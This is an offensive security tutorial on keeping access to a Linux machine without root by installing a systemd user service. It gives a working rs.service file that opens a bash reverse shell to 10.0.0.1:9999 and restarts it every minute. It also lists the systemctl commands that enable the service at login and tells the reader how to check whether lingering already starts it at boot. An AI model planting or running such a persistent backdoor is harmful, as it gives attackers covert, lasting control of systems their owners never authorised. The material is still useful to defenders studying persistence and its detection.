Systemd user level persistence
There are multiple ways to keep persistence on a Linux system after getting initial foothold. If
you have root access, there is literally infinite number of ways to do so: you can backdoor any
part of a system. However, sometimes you do not have root access and you do not really need
it, but it is always nice to keep an access to the system after it reboots.
Here I will show one way of achieving persistence on most modern Linux systems without
having root access. For some reason this method does not seem to be getting enough
attention.
It is stupidly simple: use systemd user service.

An Example
1.
Place a service file in ~/.config/systemd/user/ .
Here is a rs.service file used for a demo:
[Unit]
Description=Just a reverse shell[Service]
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'
Restart=always
RestartSec=60[Install]
WantedBy=default.target

2.
Enable the service with systemctl --user enable rs.service

Profit
That is it. On the next user login systemd will happily start a reverse shell.

You can start it right away with systemctl --user start rs.service if you don’t want
to wait for a next time system reboots.
The nice thing is that you can use most systemd features here. In the example above, I used
Restart to restart a shell automatically on a failure. You may want to use systemd timers to
run your payload periodically and not have a process constantly running if that is what you
want.

Limitations
By default, systemd --user is only started when a user logs in and a session is started. So,
this persistence method is mostly suited for desktops or kiosks and would be useless for
servers with no active user sessions.
It is possible to change this behavior and start systemd --user on boot rather than on user
login. To do so, a root must run loginctl enable-linger <username> . Obviously, we
have no root access and cannot change these settings. But it is worth checking if it has
already been enabled. In order to do so, look in /var/lib/systemd/linger directory. If
lingering is enabled for a user username , there should be an empty file with a name
username . (Per this amazing answer)
